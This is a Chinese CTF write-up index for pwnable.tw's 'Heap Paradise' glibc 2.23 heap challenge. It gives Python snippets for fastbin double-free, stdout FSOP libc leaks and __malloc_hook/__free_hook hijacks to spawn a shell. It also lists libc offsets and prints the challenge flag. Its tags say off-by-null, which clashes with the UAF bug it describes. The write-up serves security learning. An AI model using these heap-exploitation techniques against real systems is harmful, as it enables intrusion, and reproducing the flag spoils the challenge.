---
tags:
  - off-by-null
  - fastbin-dup
  - io-file-exploit
platform: pwnable.tw
points: 350
arch: x86-64
libc: glibc-2.23
relro: full
canary: yes
nx: yes
pie: yes
references:
  - https://pwnable.tw/challenge/
description: "单字节 off-by-null 溢出配合 fastbin 合并与重复分配，在没有 show 功能的情况下通过 _IO_2_1_stdout_ 泄漏 libc。"
proof-of-concept: no
---

# Heap Paradise — pwnable.tw（350 分）

[← 返回 pwnable.tw 题目索引](README.md)

> `nc chall.pwnable.tw 10308`
>
> Flag: `FLAG{W3lc0m3_2_h3ap_p4radis3}`

## 题目概览

一个极简的堆菜单程序（x86-64，Full RELRO，PIE，NX，Canary，FORTIFY），链接 glibc 2.23（无 tcache）。菜单只有分配（Allocate）、释放（Free）、退出（Exit）三项——**没有查看/打印功能**。所有分配都被限制在 `size <= 0x78`，全部落在 fastbin 范围内。`.bss` 中的全局指针数组 `ptr[16]` 最多保存 16 次分配（槽位释放后不再复用）。

```bash
checksec:
  Arch:     amd64-64-little
  RELRO:    Full RELRO         # GOT not writable
  Stack:    Canary found
  NX:       NX enabled
  PIE:      PIE enabled
  FORTIFY:  Enabled
```

## 漏洞

### V1 — Use-After-Free / Double-Free（主漏洞，可利用）

**根因：** `Free` 函数调用 `free(ptr[index])`，但**从不把 `ptr[index]` 置为 NULL**。既然槽位从不清空，同一索引就能被释放多次，已释放的指针也仍可用于制造重叠分配。

```c
void Free() {
    long index = get_long();
    if (index <= 15)
        free(ptr[index]);     // ptr[index] NOT cleared → UAF + double-free
}
```

**影响：** 经典的 fastbin 双释放原语。可造出 fastbin 重复分配（A→B→A 环），进而得到重叠分配，并能任意改写 fastbin 的 fd 指针。

### V2 — 有符号索引检查（次要，未利用）

释放时的索引检查是在有符号 long 上做 `index <= 15`。理论上负索引能释放任意的 BSS 指针，但指针数组位于可写 BSS 起始处、其前面没有有用的东西，因此没有解法使用这条路。

## 关键约束

| 约束 | 影响 |
|-----------|--------|
| `size <= 0x78` | 所有堆块都是 fastbin 尺寸（最大堆块 `0x80`）。无法直接取得 unsorted bin 的 libc 指针。 |
| 无查看/打印 | 不能通过菜单读堆内容。必须走侧信道（FSOP stdout 泄漏）。 |
| 16 槽限制 | 分配会消耗槽位且永不回收。整个利用必须在 16 次分配内完成。 |
| Full RELRO | GOT 只读。必须使用基于 hook（`__malloc_hook` / `__free_hook`）或 FSOP 的攻击。 |

## 利用路径

所有解法都是三段式结构：（1）把 libc 指针放到堆上，（2）泄漏 libc，（3）劫持控制流。差别在泄漏手法与最终目标。

---

### 路径 A — Fastbin Dup → 伪造 unsorted 堆块 → stdout FSOP 泄漏 → 覆盖 `__malloc_hook`

**相关题解：** 约占全部解法的 90%（81、138、216、378、564、821、1177、2796、5378、7905、8153、9448、13204、17704、22310、26250、31599、34817、40311、exp.py）

**阶段 1 — 把 libc 指针放到堆上：**

1. **Fastbin dup**（双释放 A→B→A）得到重叠堆块。通过写入一个部分堆地址作为 `fd` 指针，分配出与另一堆块重叠的块，从而控制相邻块的 size 字段。

2. **伪造一个 `size >= 0x80` 的堆块**（通常 `0xa1` 或 `0x91`），位于重叠区域内。该尺寸高于 fastbin 上限，因此释放后走**unsorted bin**。

3. **释放伪造块** → glibc 会把 `main_arena+0x58`（一个 libc 地址）写进该堆块在堆上的 `fd`/`bk` 字段。

```python
# Typical Phase 1 pattern:
alloc(0x68, b'f'*0x10 + p64(0) + p64(0x71))        # 0 — embed fake chunk header
alloc(0x68, b'a'*0x10 + p64(0) + p64(0x31) + ...)   # 1 — embed fake next-chunk
free(0); free(1); free(0)                             # fastbin dup: 0→1→0
alloc(0x68, b'\x20')                                  # redirect fd to heap+0x20
alloc(0x68, b'\0'); alloc(0x68, b'\0')                # consume chain
alloc(0x68, b'\0')                                    # land on fake chunk at heap+0x20
free(0)
alloc(0x68, b'd'*0x10 + p64(0) + p64(0xa1))          # overwrite fake chunk size → 0xa1
free(5)                                               # → unsorted bin → libc ptr on heap
```

**阶段 2 — 经破坏 `_IO_2_1_stdout_` 的 FSOP 泄漏 libc：**

4. unsorted bin 切分后的剩余块（或该已释放块本身）的 `fd` 字段里有 `main_arena` 指针。再用一次 fastbin dup，对这个 `fd` 指针做**部分覆盖**（2 字节），把它改指到 `_IO_2_1_stdout_ - 0x43`。

5. 在 `stdout - 0x43` 处，偏移 `+0x8` 的字节是 `0x7f`（来自相邻 libc 数据），足以通过 glibc 2.23 对 `0x70` bin 的 fastbin 尺寸检查。

6. 在 `stdout - 0x33` 处分配并覆盖 `_IO_FILE` 结构体：
   - `_flags = 0xfbad1800`（或 `0xfbad3887`）——置上 `_IO_CURRENTLY_PUTTING | _IO_IS_APPENDING`
   - 清空 `_IO_read_*` 指针
   - 把 `_IO_write_base` 的最低字节设为 `0x00` 或 `0x80`——确保 `_IO_write_base < _IO_write_ptr`

7. 下一次 `puts()` 会刷出 `[_IO_write_base, _IO_write_ptr)` 区间，**泄漏 stdout 内部缓冲区里的 libc 指针**（通常是 `_IO_2_1_stdin_` 地址）。

```python
# Partial overwrite: only low 2 bytes known, bits 12-15 are guessed → 1/16 probability
low2 = p16((_IO_2_1_stdout_ - 0x43) & 0xFFFF)  # e.g., 0x25dd or 0x45dd
alloc(0x68, padding + p64(0x71) + low2)           # partial overwrite fd
alloc(0x68, b'\0')                                 # consume
alloc(0x68, b'\0'*3 + p64(0)*6 + p64(0xfbad1800) + p64(0)*3 + b'\x00')  # corrupt stdout
# → next puts() leaks libc
```

**阶段 3 — 用 one_gadget 覆盖 `__malloc_hook`：**

8. 已知完整 libc 基址后，做最后一次 fastbin dup。把 `fd` 设为 `__malloc_hook - 0x23`（该处偏移 `+0x8` 有来自 `main_arena` 数据的字节 `0x7f` → 通过 fastbin 尺寸检查）。

9. 在 `__malloc_hook - 0x13` 处分配，写 `0x13` 字节填充 + `p64(one_gadget)` 覆盖 `__malloc_hook`。

10. 触发 `malloc()`（发送菜单选项 "1" + 任意大小）→ `__malloc_hook` 生效 → `execve("/bin/sh")` → shell。

```python
alloc(0x68, p64(__malloc_hook - 0x23))             # poison fastbin fd
alloc(0x68, b'\0')                                  # consume
alloc(0x68, b'\0')                                  # consume
alloc(0x68, b'\0'*0x13 + p64(one_gadget))           # overwrite __malloc_hook
# trigger:
sendline("1"); sendline("8")                        # malloc() → one_gadget → shell
```

**可靠性：** 阶段 2 的部分覆盖需要猜 ASLR 的 1 个 nibble（libc 基址的第 12–15 位）。成功率 **每个连接 1/16**（约 6.25%）。各解法都用重试循环包住。

---

### 路径 B — 经 `_IO_2_1_stderr_` 虚表劫持的 FSOP（无泄漏）

**相关题解：** 2311

该方案不做“先泄漏 libc 再二次 fastbin 攻击”，而是做**两次**部分覆盖 fastbin 攻击（各 1/16，合计约 1/256）：

1. 第一次 fastbin 攻击瞄准 `_IO_2_1_stderr_`，把其 `_flags` 覆盖成 `";sh\0"`，并部分覆盖 `_IO_write_base` 使之指向 `system`。

2. 第二次 fastbin 攻击瞄准 `stderr` 中部，部分覆盖**虚表指针**使其指向构造好的 `system` 地址。

3. 触发 `_IO_flush_all_lockp`（借助一次故意的双释放 abort）。刷新代码会调用 `stderr->vtable->__overflow(stderr)`，解析为 `system(stderr)`；由于 `stderr->_flags` 以 `";sh\0"` 开头，shell 命令随即执行。

**可靠性：** 每个连接约 1/256（两次独立的 1/16 猜测）。比路径 A 慢很多，但完全不需要泄漏。

---

### 路径 C — 经 `__free_hook` 覆盖 stdout 虚表

**相关题解：** 331、378、564、821

这是路径 A 阶段 2 泄漏 libc 之后的一种收尾变体：

1. 用 fastbin dup 分配到 `_IO_2_1_stdout_` 的虚表区域附近。
2. 覆盖虚表指针或 `__overflow` 项，使其指向 `system`。
3. 触发输出（例如菜单提示），经被破坏的虚表调用 → `system("/bin/sh")`，或 `system(stdout)`（其 `_flags` 含 `";sh"`）。

另一种收尾：部分解法改为瞄准 `__free_hook`：

```python
# unsorted bin attack to write main_arena near __free_hook → create fake fastbin chunk
alloc(0x78, p64(0)*11 + p64(0x71) + p64(__free_hook - 0x33))
alloc(0x68, b"/bin/sh\x00")           # this chunk's content = "/bin/sh"
alloc(0x68, padding + p64(system))     # overwrite __free_hook
free(idx_of_binsh_chunk)              # free("/bin/sh") → system("/bin/sh")
```

---

### 路径 D — 双释放 abort 触发 `__malloc_hook`

**相关题解：** 17704、31599、34817

在把 `__malloc_hook` 覆盖为 one_gadget 之后，不发送正常的 malloc 菜单选项，而是触发一次**故意的双释放**。glibc 的 abort 处理路径内部会调用 `malloc()`（用于格式化错误信息），从而触发 `__malloc_hook` → one_gadget → shell。

```python
# After __malloc_hook = one_gadget:
free(0); free(0)   # double-free → abort → malloc() internally → __malloc_hook → shell
```

## 利用原语总结

| 原语 | 来源 | 可靠性 |
|-----------|--------|-------------|
| 双释放（fastbin dup） | V1：UAF / 不清指针 | 确定性 |
| 堆重叠 / 伪造堆块 | Fastbin dup + 部分写 fd | 确定性 |
| 伪造 unsorted bin 堆块 | 重叠 → 写 size ≥ 0x80 → 释放 | 确定性 |
| 堆上的 libc 指针 | unsorted bin 释放写入 main_arena | 确定性 |
| stdout FSOP 泄漏 | 部分覆盖 fd → stdout-0x43 | 1/16（猜 nibble） |
| `__malloc_hook` 覆盖 | Fastbin dup → malloc_hook-0x23（0x7f） | 泄漏后确定性 |
| 代码执行 | 经 `__malloc_hook` 的 one_gadget 或经 `__free_hook` 的 `system` | 覆盖后确定性 |

## 偏移（pwnable.tw `libc_64.so.6`，glibc 2.23）

```python
_IO_2_1_stdout_ = 0x3c4620
_IO_2_1_stdin_  = 0x3c38e0
_IO_2_1_stderr_ = 0x3c4540
__malloc_hook   = 0x3c3b10    # main_arena = __malloc_hook + 0x10
__free_hook     = 0x3c57a8
system          = 0x45390
one_gadgets     = [0x45216, 0x4526a, 0xef6c4, 0xf0567]
```

## 题解文章

| 文件 | 主要路径 | 关键技术 | 备注 |
|------|-------------|---------------|-------|
| `81.md` | A | Fastbin dup → unsorted → stdout FSOP → `__malloc_hook` | 干净的最小利用 |
| `138.md` | A | Ruby 利用脚本；同样三段式 | 用 `_IO_2_1_stderr_+157` 作伪造块 |
| `216.md` | A | Fastbin dup → stdout FSOP → `__malloc_hook` | 标准套路 |
| `331.md` | C | stdout FSOP → 覆盖虚表 → `system` | 劫持 stdout 虚表而非 hook |
| `378.md` | C | stdout 虚表 + FSOP → 经虚表调 `system` | 在 `_flags` 里放 `";sh"` |
| `564.md` | A+C | stdout FSOP → 覆盖虚表 + one_gadget | 两阶段虚表/hook |
| `821.md` | A+C | stdout FSOP → 经 unsorted bin attack 写 `__free_hook` | 用 unsorted bin attack 打 `__free_hook` |
| `1177.md` | A | Fastbin dup → stdout FSOP → `__malloc_hook` | 本地进程利用 |
| `2311.md` | B | **无泄漏**：双重部分覆盖 → stderr 虚表 → `_IO_flush_all_lockp` | 约 1/256 爆破；不需泄漏 libc |
| `2796.md` | A | 标准三段式 | 简洁实现 |
| `5378.md` | A | stdout FSOP → `__malloc_hook` | 已确认 `FLAG{W3lc0m3_2_h3ap_p4radis3}` |
| `7905.md` | A | 详细中文题解；完整阶段拆解 | 教学价值最高 |
| `8153.md` | A | 中文题解；清晰的重叠分析 | 指出有符号索引 bug |
| `9448.md` | A | 标准做法 + 重试循环 | 清晰的堆布局图示 |
| `13204.md` | A | 极简利用 + 重试装饰器 | 用 `0x3c3aed` 作 `__malloc_hook` 伪造块 |
| `17704.md` | A+D | stdout FSOP → `__malloc_hook` → 双释放 abort 触发 | 用 abort 路径触发 |
| `22310.md` | A | 标准三段式 + 爆破 | 用 `0x45dd` 部分覆盖 |
| `26250.md` | A | 标准三段式 | 详细堆布局注释 |
| `31599.md` | A+D | stdout FSOP → `__malloc_hook` → 双释放 abort | 注释里附堆图 |
| `34817.md` | A | “伪造 unsortedbin、angelboy 的泄漏、劫持 malloc hooks” | 干净收尾 |
| `40311.md` | A | 标准三段式；干净的 Python3 | 重试循环，简洁 |

## 文件

| 文件 | 说明 |
|------|-------------|
| `exp.py` | 可用利用脚本（自包含，无 pwntools 依赖） |
| `desc.txt` | 题目描述 |
| `solution/*.md` | 社区题解文章（71 个解法） |
